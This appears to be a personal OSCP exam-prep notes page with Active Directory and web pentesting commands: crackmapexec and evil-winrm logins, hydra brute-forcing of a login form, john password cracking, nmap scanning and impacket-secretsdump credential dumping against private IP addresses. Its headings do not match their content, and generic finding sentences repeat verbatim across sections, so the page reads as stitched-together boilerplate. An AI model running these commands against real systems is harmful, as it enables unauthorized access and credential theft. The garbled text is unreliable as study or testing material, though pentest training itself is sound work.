---
TitleSEO: "OSCP Exam Preparation Notes | ZureFX"
TitlePost: "OSCP Exam Preparation Notes"
Author: "ZureFX"
Description: "Personal notes on OSCP Exam Preparation Notes. Quick reference for pentesting and CTF challenges."
Keywords: "dfir, persistence, networking"
URL: "https://zurefx.github.io/notes/note-oscp-exam-preparation-notes-964.html"
URL_IMAGES: ""
Date: "2025-06-17"
Tags: "DFIR, Persistence, Networking"
Section: "notes"
Lang: "en"
main_img: "note-oscp-exam-preparation-notes-964"
Permalink: "/notes/note-oscp-exam-preparation-notes-964.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Path Traversal

### mimikatz

Command injection was possible through unsanitized user input in the search functionality. Group Policy Preferences contained encrypted but recoverable credentials. Weak file permissions allowed modification of critical system files.

The application stored sensitive credentials in an unencrypted configuration file. The scheduled task ran with elevated privileges and could be abused for escalation.

## CMD

### GetUserSPNs

Group Policy Preferences contained encrypted but recoverable credentials. Command injection was possible through unsanitized user input in the search functionality. Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
crackmapexec smb 10.64.59.96 -u administrator -p 'P@ssw0rd!' --shares
```

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.97.95.160 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Weak file permissions allowed modification of critical system files. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
evil-winrm -i 10.57.122.146 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.104.204.108 -u administrator -p 'P@ssw0rd!' --shares
```

## Subdomain Takeover

### XSS

- `hashcat`
- `Golden Ticket`
- `ffuf`

```bash
nmap -sCV -p139,3306,636 10.63.117.221 -oN scan.txt
evil-winrm -i 10.22.79.152 -u administrator -p 'P@ssw0rd!'
```

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.24.15.167
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.90.48.221 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.92.183.178 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.65.56.12 -u administrator -p 'P@ssw0rd!' --shares
```

- `Pass the Hash`
- `Kerberoasting`
- `NTLM Relay`
- `Broken Access Control`
- `DCSync`
- `wmiexec`

## Cron Job

### Sudo Misconfiguration

Group Policy Preferences contained encrypted but recoverable credentials. The kernel version was outdated and vulnerable to a publicly known exploit. The database credentials were hardcoded in the application source code. Lateral movement was facilitated by reusing discovered credentials across services.

Command injection was possible through unsanitized user input in the search functionality. The backup files contained sensitive information that should not have been accessible. The backup files contained sensitive information that should not have been accessible. The service account had excessive permissions assigned in Active Directory. The service was running without proper input validation, leading to injection vulnerabilities.
